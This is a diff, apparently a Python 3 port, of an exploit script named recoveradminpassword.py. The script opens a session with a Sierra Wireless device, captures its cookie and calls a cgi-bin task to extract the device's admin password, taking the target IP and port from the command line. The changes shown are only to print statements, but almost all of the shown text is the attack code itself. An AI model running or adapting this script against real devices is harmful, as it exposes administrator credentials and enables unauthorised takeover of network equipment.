@@ -33,7 +33,7 @@ class SierraWirelessPasswordRecovery:
         self.xml_connect_payload = self.xml_connect_payload.replace("$username$", self.user)
         self.xml_connect_payload = self.xml_connect_payload.replace("$password$", self.password)
         if self.verbose:
-            print "[*] Establishing a session..."
+            print("[*] Establishing a session...")
         conn = httplib.HTTPConnection(self.target, self.port, timeout=25)
         conn.request(self.xml_connect['method'], self.xml_connect['path'], 
                      self.xml_connect_payload, self.headers)
@@ -42,7 +42,7 @@ class SierraWirelessPasswordRecovery:
         headers = response.getheaders()
         cookie = headers[1][1].split(';')
         if self.verbose:
-            print "[*] Cookie recovered: {0}".format(colored(cookie[0], 'green'))
+            print("[*] Cookie recovered: {0}".format(colored(cookie[0], 'green')))
         self.cookie = cookie[0]
         # print data
 
@@ -51,7 +51,7 @@ class SierraWirelessPasswordRecovery:
         # print headers_with_cookie
         # print self.headers
         if self.verbose:
-            print "[*] Running cgi-bin to recover admin password..."
+            print("[*] Running cgi-bin to recover admin password...")
         conn = httplib.HTTPConnection(self.target, self.port, timeout=25)
         conn.request(self.cgi_get_task['method'], self.cgi_get_task['path'],
                      self.cgi_get_task['payload'], self.headers)
@@ -63,13 +63,13 @@ class SierraWirelessPasswordRecovery:
         recovered_password = re.findall(r"5003=(?P<password>.*)!", str(data))
         if recovered_password:
             if self.verbose:
-                print "[*] Admin password recovered: {0}".format(colored(recovered_password[0], 'red'))
+                print("[*] Admin password recovered: {0}".format(colored(recovered_password[0], 'red')))
             return recovered_password
 
 
 def main():
     if len(sys.argv) != 3:
-        print "[!] Usage: recoveradminpassword.py <ip_address> <port>"
+        print("[!] Usage: recoveradminpassword.py <ip_address> <port>")
         exit(0)
     else:
         target = sys.argv[1]
